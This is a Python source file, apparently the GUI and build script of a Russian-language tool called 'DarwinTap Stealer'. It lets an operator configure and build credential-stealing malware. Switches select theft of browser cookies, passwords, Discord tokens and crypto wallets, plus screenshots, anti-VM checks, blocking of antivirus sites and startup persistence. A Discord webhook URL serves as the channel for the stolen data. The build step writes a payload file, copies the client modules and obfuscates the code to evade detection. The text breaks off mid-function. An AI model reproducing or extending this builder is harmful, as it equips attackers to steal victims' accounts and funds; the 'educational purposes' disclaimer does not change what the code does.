import flet as ft
from flet import (
    Page, 
    Container, 
    Row, 
    Column, 
    Text, 
    IconButton, 
    Switch, 
    Slider, 
    ElevatedButton,
    Icon,
    Icons,
    ButtonStyle,
    RoundedRectangleBorder,
    colors,
    alignment,
    border_radius,
    margin,
    padding,
    Border,
    BorderSide,
    TextField,
)
import asyncio
import os
import subprocess
import time
from client import send_zip
from utils import block_sites
import builder as builder_module

def main(page: Page):
    # –û—Å–Ω–æ–≤–Ω—ã–µ —Ü–≤–µ—Ç–∞ –∏ —Å—Ç–∏–ª–∏
    bg_color = "#0d1924"  # –¢–µ–º–Ω–æ-—Å–∏–Ω–∏–π —Ñ–æ–Ω
    sidebar_color = "#0d1924"  # –¶–≤–µ—Ç –±–æ–∫–æ–≤–æ–π –ø–∞–Ω–µ–ª–∏
    content_color = "#111f2c"  # –¶–≤–µ—Ç –æ—Å–Ω–æ–≤–Ω–æ–π –æ–±–ª–∞—Å—Ç–∏
    accent_color = "#3a8ff2"  # –ì–æ–ª—É–±–æ–π –∞–∫—Ü–µ–Ω—Ç–Ω—ã–π —Ü–≤–µ—Ç
    text_color = "#ffffff"
    secondary_text_color = "#8c9eb0"
    divider_color = "#1e3040"

    page.bgcolor = bg_color
    page.title = "DarwinTap"
    page.window_width = 900
    page.window_height = 600
    page.window_min_width = 900
    page.window_min_height = 600
    page.theme_mode = ft.ThemeMode.DARK
    page.padding = 0
    
    # –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Ä–∞–∑–¥–µ–ª–æ–≤
    current_section = "stealer"
    
    # –§–∏–∫—Ç–∏–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º–º—ã
    status_text = Text("–ì–æ—Ç–æ–≤ –∫ –∑–∞–ø—É—Å–∫—É —Å–±–æ—Ä–∫–∏...", color=secondary_text_color, size=12)
    logs_text = Text("", color=secondary_text_color, size=12, selectable=True)
    
    # –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –ø–æ–ª–µ–π –≤–≤–æ–¥–∞
    webhook_input = TextField(
        label="Discord Webhook URL",
        border_color=accent_color,
        color=text_color,
        bgcolor="#0a1520",
        label_style=ft.TextStyle(color=secondary_text_color),
        cursor_color=accent_color,
        text_size=14,
    )
    
    icon_path_input = TextField(
        label="–ü—É—Ç—å –∫ –∏–∫–æ–Ω–∫–µ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)",
        border_color=accent_color,
        color=text_color,
        bgcolor="#0a1520",
        label_style=ft.TextStyle(color=secondary_text_color),
        cursor_color=accent_color,
        text_size=14,
    )
    
    # –°–µ–∫—Ü–∏—è —Å—Ç–∏–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–≥–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞
    header = Container(
        content=Row(
            controls=[
                # –õ–æ–≥–æ –∏ –Ω–∞–∑–≤–∞–Ω–∏–µ
                Row(
                    controls=[
                        Container(
                            content=Text("üåå", size=20),
                            margin=margin.only(right=5)
                        ),
                        Text("DarwinTap", color=accent_color, weight="bold", size=16),
                    ],
                ),
                # –ü–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª—å —è–∑—ã–∫–∞
                Row(
                    controls=[
                        Container(
                            content=Text("RUS", color=accent_color, weight="bold", size=14),
                            margin=margin.only(right=10)
                        ),
                        Container(
                            content=Text("ENG", color=secondary_text_color, size=14),
                        ),
                        # –†–µ–∂–∏–º —Ç–µ–º—ã
                        Container(
                            content=Icon(Icons.DARK_MODE, color=secondary_text_color, size=18),
                            margin=margin.only(left=20)
                        ),
                    ],
                    alignment=ft.MainAxisAlignment.END,
                ),
            ],
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
        ),
        padding=padding.only(left=20, right=20, top=15, bottom=15),
        border=Border(bottom=BorderSide(width=1, color=divider_color)),
    )
    
    # –§—É–Ω–∫—Ü–∏—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –ø—É–Ω–∫—Ç–∞ –º–µ–Ω—é
    def update_selected_menu(selected_text):
        nonlocal current_section
        current_section = selected_text.lower()
        
        for item in sidebar_controls:
            item_text = item.content.controls[1].value
            is_selected = item_text.lower() == current_section
            item.bgcolor = content_color if is_selected else None
            item.content.controls[1].color = accent_color if is_selected else text_color
            item.content.controls[1].weight = "bold" if is_selected else "normal"
        
        if current_section == "stealer":
            content.content.controls = [stealer_section]
        elif current_section == "builder":
            content.content.controls = [builder_section]
        elif current_section == "settings":
            content.content.controls = [settings_section]
        
        page.update()
    
    # –§—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è —ç–ª–µ–º–µ–Ω—Ç–∞ –±–æ–∫–æ–≤–æ–≥–æ –º–µ–Ω—é
    def create_sidebar_item(icon, text, selected=False):
        return Container(
            content=Row(
                controls=[
                    Text(icon, size=16),
                    Text(
                        text, 
                        color=accent_color if selected else text_color,
                        weight="bold" if selected else "normal",
                        size=14
                    )
                ],
                spacing=10,
            ),
            padding=padding.only(left=16, top=8, bottom=8, right=16),
            border_radius=border_radius.all(5),
            bgcolor=content_color if selected else None,
            on_click=lambda e: update_selected_menu(text)
        )
    
    # –°–æ–∑–¥–∞–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã –±–æ–∫–æ–≤–æ–≥–æ –º–µ–Ω—é
    sidebar_items = [
        {"icon": "üîë", "text": "Stealer", "selected": True},
        {"icon": "üõ†Ô∏è", "text": "Builder", "selected": False},
        {"icon": "‚öôÔ∏è", "text": "Settings", "selected": False},
    ]
    
    # –°–æ–∑–¥–∞–µ–º –ø–∞–Ω–µ–ª—å –±–æ–∫–æ–≤–æ–π –Ω–∞–≤–∏–≥–∞—Ü–∏–∏
    sidebar_controls = [create_sidebar_item(item["icon"], item["text"], item.get("selected", False)) for item in sidebar_items]
    
    # –ë–æ–∫–æ–≤–∞—è –ø–∞–Ω–µ–ª—å
    sidebar = Container(
        content=Column(
            controls=sidebar_controls,
            spacing=2,
            scroll=ft.ScrollMode.AUTO,
        ),
        width=180,
        bgcolor=sidebar_color,
        border=Border(right=BorderSide(width=1, color=divider_color)),
        padding=padding.only(top=10)
    )
    
    # –ü–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª–∏ –æ–ø—Ü–∏–π –¥–ª—è Stealer
    cookies_switch = Switch(value=True, active_color=accent_color)
    passwords_switch = Switch(value=True, active_color=accent_color)
    discord_tokens_switch = Switch(value=True, active_color=accent_color)
    crypto_wallets_switch = Switch(value=True, active_color=accent_color)
    screenshot_switch = Switch(value=True, active_color=accent_color)
    zip_switch = Switch(value=True, active_color=accent_color)
    anti_vm_switch = Switch(value=True, active_color=accent_color)
    block_av_switch = Switch(value=False, active_color=accent_color)
    
    # –°–µ–∫—Ü–∏—è —Å –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏ –¥–ª—è Stealer
    stealer_section = Container(
        content=Column([
            Text("Stealer", color=text_color, size=16, weight="bold"),
            Container(height=10),
            
            Row([
                Text("Collect Browser Cookies", color=text_color, size=14),
                cookies_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Passwords", color=text_color, size=14),
                passwords_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Discord Tokens", color=text_color, size=14),
                discord_tokens_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Crypto Wallets", color=text_color, size=14),
                crypto_wallets_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Take Screenshot", color=text_color, size=14),
                screenshot_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Pack to ZIP Archive", color=text_color, size=14),
                zip_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Anti-VM", color=text_color, size=14),
                anti_vm_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Block AV Sites", color=text_color, size=14),
                block_av_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Container(height=10),
            
            Container(
                content=webhook_input,
                margin=margin.only(bottom=10),
            ),

            Container(height=10),
            
            Row([
                ElevatedButton(
                    content=Text("–ù–∞—á–∞—Ç—å —Å–±–æ—Ä–∫—É", size=14, weight="bold"),
                    style=ButtonStyle(
                        bgcolor=accent_color,
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: start_building(e),
                ),
                ElevatedButton(
                    content=Text("–°–±—Ä–æ—Å", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: reset_stealer_fields(),
                ),
            ], alignment=ft.MainAxisAlignment.START, spacing=10),
            
            Container(height=20),
            Text("–°—Ç–∞—Ç—É—Å:", color=text_color, size=14, weight="bold"),
            status_text,
            Container(height=10),
            Text("–õ–æ–≥–∏:", color=text_color, size=14, weight="bold"),
            Container(
                content=logs_text,
                bgcolor="#0a1520",
                border_radius=border_radius.all(5),
                padding=10,
                expand=True,
            ),
        ]),
        padding=20,
        bgcolor=content_color,
        border_radius=border_radius.all(5),
        margin=margin.only(bottom=20),
        expand=True,
    )
    
    # –°–µ–∫—Ü–∏—è Builder
    builder_section = Container(
        content=Column([
            Text("Builder", color=text_color, size=16, weight="bold"),
            Container(height=20),
            
            Text("–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –≤—ã—Ö–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª–∞", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            # –ü–æ–ª–µ –¥–ª—è –≤–≤–æ–¥–∞ Discord webhook URL
            Text("Discord Webhook URL (–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)", color=text_color, size=14),
            Container(
                content=webhook_input,
                margin=margin.only(top=5, bottom=15),
            ),
            
            # –ü–æ–ª–µ –¥–ª—è –≤–≤–æ–¥–∞ –ø—É—Ç–∏ –∫ –∏–∫–æ–Ω–∫–µ
            Text("–ü—É—Ç—å –∫ –∏–∫–æ–Ω–∫–µ", color=text_color, size=14),
            Container(
                content=icon_path_input,
                margin=margin.only(top=5, bottom=15),
            ),
            
            Text("–û–ø—Ü–∏–∏ —Å–±–æ—Ä–∫–∏", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            # –¢–µ –∂–µ –ø–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª–∏, —á—Ç–æ –∏ –≤ Stealer
            Row([
                Text("Collect Browser Cookies", color=text_color, size=14),
                cookies_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Passwords", color=text_color, size=14),
                passwords_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Discord Tokens", color=text_color, size=14),
                discord_tokens_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Collect Crypto Wallets", color=text_color, size=14),
                crypto_wallets_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Take Screenshot", color=text_color, size=14),
                screenshot_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Pack to ZIP Archive", color=text_color, size=14),
                zip_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Anti-VM", color=text_color, size=14),
                anti_vm_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("Block AV Sites", color=text_color, size=14),
                block_av_switch,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Container(height=20),
            
            Row([
                ElevatedButton(
                    content=Text("–°–æ–±—Ä–∞—Ç—å –±–∏–ª–¥", size=14, weight="bold"),
                    style=ButtonStyle(
                        bgcolor=accent_color,
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: start_building(e),
                ),
                ElevatedButton(
                    content=Text("–°–±—Ä–æ—Å –Ω–∞—Å—Ç—Ä–æ–µ–∫", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: reset_stealer_fields(),
                ),
                ElevatedButton(
                    content=Text("–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                    on_click=lambda e: check_dependencies(),
                ),
            ], alignment=ft.MainAxisAlignment.START, spacing=10),
        ]),
        padding=20,
        bgcolor=content_color,
        border_radius=border_radius.all(5),
        margin=margin.only(bottom=20),
        expand=True,
    )
    
    # –°–µ–∫—Ü–∏—è Settings
    settings_section = Container(
        content=Column([
            Text("Settings", color=text_color, size=16, weight="bold"),
            Container(height=20),
            
            Text("–í–Ω–µ—à–Ω–∏–π –≤–∏–¥", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            Row([
                Text("–¢–µ–º–Ω–∞—è —Ç–µ–º–∞", color=text_color, size=14),
                Switch(value=True, active_color=accent_color),
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("–Ø–∑—ã–∫ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞", color=text_color, size=14),
                ft.Dropdown(
                    options=[
                        ft.dropdown.Option("–†—É—Å—Å–∫–∏–π"),
                        ft.dropdown.Option("English"),
                    ],
                    value="–†—É—Å—Å–∫–∏–π",
                    width=150,
                    text_size=14,
                    color=text_color,
                    bgcolor="#0a1520",
                    border_color=accent_color,
                ),
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Container(height=20),
            Text("–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            Row([
                Text("–ü—Ä–æ–≤–µ—Ä—è—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è", color=text_color, size=14),
                Switch(value=True, active_color=accent_color),
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Row([
                Text("–ê–≤—Ç–æ–æ—á–∏—Å—Ç–∫–∞ –ª–æ–≥–æ–≤", color=text_color, size=14),
                Switch(value=False, active_color=accent_color),
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            
            Container(height=20),
            Text("–û –ø—Ä–æ–≥—Ä–∞–º–º–µ", color=text_color, size=14, weight="bold"),
            Container(height=10),
            
            Container(
                content=Column([
                    Text("DarwinTap Stealer", color=text_color, size=14, weight="bold"),
                    Text("–í–µ—Ä—Å–∏—è: 1.0.0", color=secondary_text_color, size=12),
                    Text("–°–æ–∑–¥–∞–Ω–æ –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö", color=secondary_text_color, size=12),
                ]),
                padding=15,
                bgcolor="#0a1520",
                border_radius=border_radius.all(5),
            ),
            
            Container(height=20),
            
            Row([
                ElevatedButton(
                    content=Text("–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                ),
                ElevatedButton(
                    content=Text("–°–±—Ä–æ—Å–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏", size=14),
                    style=ButtonStyle(
                        bgcolor="#1e3040",
                        color=text_color,
                        shape=RoundedRectangleBorder(radius=5),
                    ),
                ),
            ], alignment=ft.MainAxisAlignment.START, spacing=10),
        ]),
        padding=20,
        bgcolor=content_color,
        border_radius=border_radius.all(5),
        margin=margin.only(bottom=20),
        expand=True,
    )
    
    def update_logs(message):
        current_time = time.strftime("%H:%M:%S")
        logs_text.value = f"{logs_text.value}[{current_time}] {message}\n"
        page.update()
    
    def update_status(message):
        status_text.value = message
        page.update()
    
    def reset_stealer_fields():
        # –°–±—Ä–æ—Å –≤—Å–µ—Ö –ø–æ–ª–µ–π –∏ –ø–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª–µ–π –∫ –∑–Ω–∞—á–µ–Ω–∏—è–º –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        cookies_switch.value = True
        passwords_switch.value = True
        discord_tokens_switch.value = True
        crypto_wallets_switch.value = True
        screenshot_switch.value = True
        zip_switch.value = True
        anti_vm_switch.value = True
        block_av_switch.value = False
        webhook_input.value = ""
        icon_path_input.value = ""
        logs_text.value = ""
        update_status("–ì–æ—Ç–æ–≤ –∫ –∑–∞–ø—É—Å–∫—É —Å–±–æ—Ä–∫–∏...")
        page.update()
    
    # –°–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    def simulate_building_sync():
        import threading
        import time
        import sys
        import shutil
        import tempfile
        import os
        
        def run():
            # –≠–º—É–ª–∏—Ä—É–µ–º –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –≤ —Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–º –∫–æ–¥–µ
            update_status("–ù–∞—á–∞–ª–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å–±–æ—Ä–∫–∏...")
            update_logs("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å–±–æ—Ä–∫–∏")
            time.sleep(0.5)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ webhook URL
            if not webhook_input.value:
                update_logs("–û—à–∏–±–∫–∞: –Ω–µ —É–∫–∞–∑–∞–Ω Discord Webhook URL")
                update_status("–û—à–∏–±–∫–∞: –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã")
                return
            
            update_logs("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏...")
            time.sleep(0.5)
            
            # –°–æ–±–∏—Ä–∞–µ–º –æ–ø—Ü–∏–∏ –¥–ª—è –±–∏–ª–¥–∞
            options = {
                'collect_cookies': cookies_switch.value,
                'collect_passwords': passwords_switch.value,
                'collect_discord_tokens': discord_tokens_switch.value,
                'collect_crypto_wallets': crypto_wallets_switch.value,
                'take_screenshot': screenshot_switch.value,
                'pack_to_zip': zip_switch.value,
                'anti_vm': anti_vm_switch.value,
                'block_av_sites': block_av_switch.value,
                'add_to_startup': True
            }
            
            update_logs(f"–û–ø—Ü–∏–∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏: {', '.join([k for k, v in options.items() if v])}")
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—É—Ç–∏ –∫ –∏–∫–æ–Ω–∫–µ
            icon_path = None
            if icon_path_input.value:
                if os.path.exists(icon_path_input.value):
                    icon_path = icon_path_input.value
                    update_logs(f"–£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∞—è –∏–∫–æ–Ω–∫–∞: {icon_path}")
                else:
                    update_logs(f"–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ: —É–∫–∞–∑–∞–Ω–Ω–∞—è –∏–∫–æ–Ω–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: {icon_path_input.value}")
            
            # –§–∏–∫—Å–∏–º –ø—É—Ç–∏, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –≤–ª–æ–∂–µ–Ω–Ω–æ—Å—Ç–∏ build_temp/build_temp/...
            current_dir = os.getcwd()
            build_dir = os.path.join(current_dir, "build_temp")
            
            # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –¥–ª—è —Å–±–æ—Ä–∫–∏
            try:
                # –£–¥–∞–ª—è–µ–º –µ—Å–ª–∏ —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
                if os.path.exists(build_dir):
                    shutil.rmtree(build_dir)
                os.makedirs(build_dir)
                
                update_logs(f"–°–æ–∑–¥–∞–Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –¥–ª—è —Å–±–æ—Ä–∫–∏: {build_dir}")
                
                # –°–æ–∑–¥–∞–µ–º main.py —Ñ–∞–π–ª —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
                main_py_content = f"""
import os
import sys
import json
from client import main

# Webhook URL –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
WEBHOOK_URL = "{webhook_input.value}"

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å—Ç–∏–ª–µ—Ä–∞
OPTIONS = {options}

if __name__ == "__main__":
    main(WEBHOOK_URL)
"""
                
                # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º main.py —Ñ–∞–π–ª —Å —è–≤–Ω—ã–º —É–∫–∞–∑–∞–Ω–∏–µ–º –∫–æ–¥–∏—Ä–æ–≤–∫–∏
                main_py_path = os.path.join(build_dir, "main.py")
                with open(main_py_path, "w", encoding="utf-8") as f:
                    f.write(main_py_content)
                
                update_logs("–°–æ–∑–¥–∞–Ω —Ñ–∞–π–ª main.py")
                
                # –ö–æ–ø–∏—Ä—É–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –º–æ–¥—É–ª–∏ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é —Å–±–æ—Ä–∫–∏
                for module_file in ["client.py", "utils.py", "obfuscator.py"]:
                    if os.path.exists(module_file):
                        shutil.copy(module_file, build_dir)
                        update_logs(f"–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –º–æ–¥—É–ª—å {module_file}")
                    else:
                        update_logs(f"–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ: –º–æ–¥—É–ª—å {module_file} –Ω–µ –Ω–∞–π–¥–µ–Ω")
                
                # –ü—Ä–æ–±—É–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏—é
                try:
                    # –ü—ã—Ç–∞–µ–º—Å—è –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏
                    obfuscate = None
                    basic_obfuscation = None
                    
                    try:
                        from obfuscator import obfuscate
                        update_logs("–ò–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–ª–Ω–æ–π –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏")
                    except ImportError:
                        update_logs("–§—É–Ω–∫—Ü–∏—è –ø–æ–ª–Ω–æ–π –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞")
                    
                    try:
                        from obfuscator import basic_obfuscation
                        update_logs("–ò–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è –±–∞–∑–æ–≤–æ–π –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏")
                    except ImportError:
                        update_logs("–§—É–Ω–∫—Ü–∏—è –±–∞–∑–æ–≤–æ–π –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞")
                    
                    if not obfuscate and not basic_obfuscation:
                        update_logs("–í–Ω–µ—à–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã, –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –≤—Å—Ç—Ä–æ–µ–Ω–Ω–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è")
                    
                    update_logs("–ó–∞–ø—É—Å–∫ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏...")
                    
                    # –û–±—Ñ—É—Å–∫–∞—Ü–∏—è –∫–æ–¥–∞
                    obfuscation_success = False
                    
                    # –ú–µ—Ç–æ–¥ 1: –ü–æ–ª–Ω–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏—é obfuscate
                    if obfuscate:
                        try:
                            update_logs("–ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª–Ω–æ–π –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ (–º–µ—Ç–æ–¥ 1)...")
                            # –°–æ–∑–¥–∞–µ–º –±–µ–∑–æ–ø–∞—Å–Ω—É—é –∫–æ–ø–∏—é –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª–∞
                            backup_file = main_py_path + ".bak"
                            shutil.copy(main_py_path, backup_file)
                            
                            try:
                                # –í—ã–∑—ã–≤–∞–µ–º —Ñ—É–Ω–∫—Ü–∏—é obfuscate, —É–∫–∞–∑—ã–≤–∞—è –≤—Ö–æ–¥–Ω–æ–π –∏ –≤—ã—Ö–æ–¥–Ω–æ–π —Ñ–∞–π–ª
                                result_path = obfuscate(main_py_path, main_py_path)
                                
                                # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                                if os.path.exists(main_py_path) and os.path.getsize(main_py_path) > 0:
                                    update_logs("–ö–æ–¥ —É—Å–ø–µ—à–Ω–æ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω –º–µ—Ç–æ–¥–æ–º 1")
                                    obfuscation_success = True
                                else:
                                    update_logs("–ú–µ—Ç–æ–¥ 1: –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ñ–∞–π–ª –Ω–µ —Å–æ–∑–¥–∞–Ω –∏–ª–∏ –ø—É—Å—Ç")
                                    # –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–∑ —Ä–µ–∑–µ—Ä–≤–Ω–æ–π –∫–æ–ø–∏–∏
                                    shutil.copy(backup_file, main_py_path)
                            except Exception as e:
                                update_logs(f"–û—à–∏–±–∫–∞ –≤ –º–µ—Ç–æ–¥–µ 1: {str(e)}")
                                # –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–∑ —Ä–µ–∑–µ—Ä–≤–Ω–æ–π –∫–æ–ø–∏–∏
                                if os.path.exists(backup_file):
                                    shutil.copy(backup_file, main_py_path)
                            
                            # –£–¥–∞–ª—è–µ–º —Ä–µ–∑–µ—Ä–≤–Ω—É—é –∫–æ–ø–∏—é
                            if os.path.exists(backup_file):
                                os.remove(backup_file)
                        except Exception as full_ex:
                            update_logs(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –º–µ—Ç–æ–¥–∞ 1: {str(full_ex)}")
                    
                    # –ú–µ—Ç–æ–¥ 2: –ë–∞–∑–æ–≤–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ basic_obfuscation
                    if not obfuscation_success and basic_obfuscation:
                        try:
                            update_logs("–ü–æ–ø—ã—Ç–∫–∞ –±–∞–∑–æ–≤–æ–π –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ (–º–µ—Ç–æ–¥ 2)...")
                            # –ß–∏—Ç–∞–µ–º —Ñ–∞–π–ª
                            with open(main_py_path, 'r', encoding='utf-8') as f:
                                code_content = f.read()
                            
                            # –ü—Ä–∏–º–µ–Ω—è–µ–º –±–∞–∑–æ–≤—É—é –æ–±—Ñ—É—Å–∫–∞—Ü–∏—é
                            obfuscated_code = basic_obfuscation(code_content)
                            
                            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –æ–±—Ä–∞—Ç–Ω–æ
                            with open(main_py_path, 'w', encoding='utf-8') as f:
                                f.write(obfuscated_code)
                            
                            update_logs("–ö–æ–¥ —É—Å–ø–µ—à–Ω–æ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω –º–µ—Ç–æ–¥–æ–º 2 (–±–∞–∑–æ–≤–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è)")
                            obfuscation_success = True
                        except Exception as basic_ex:
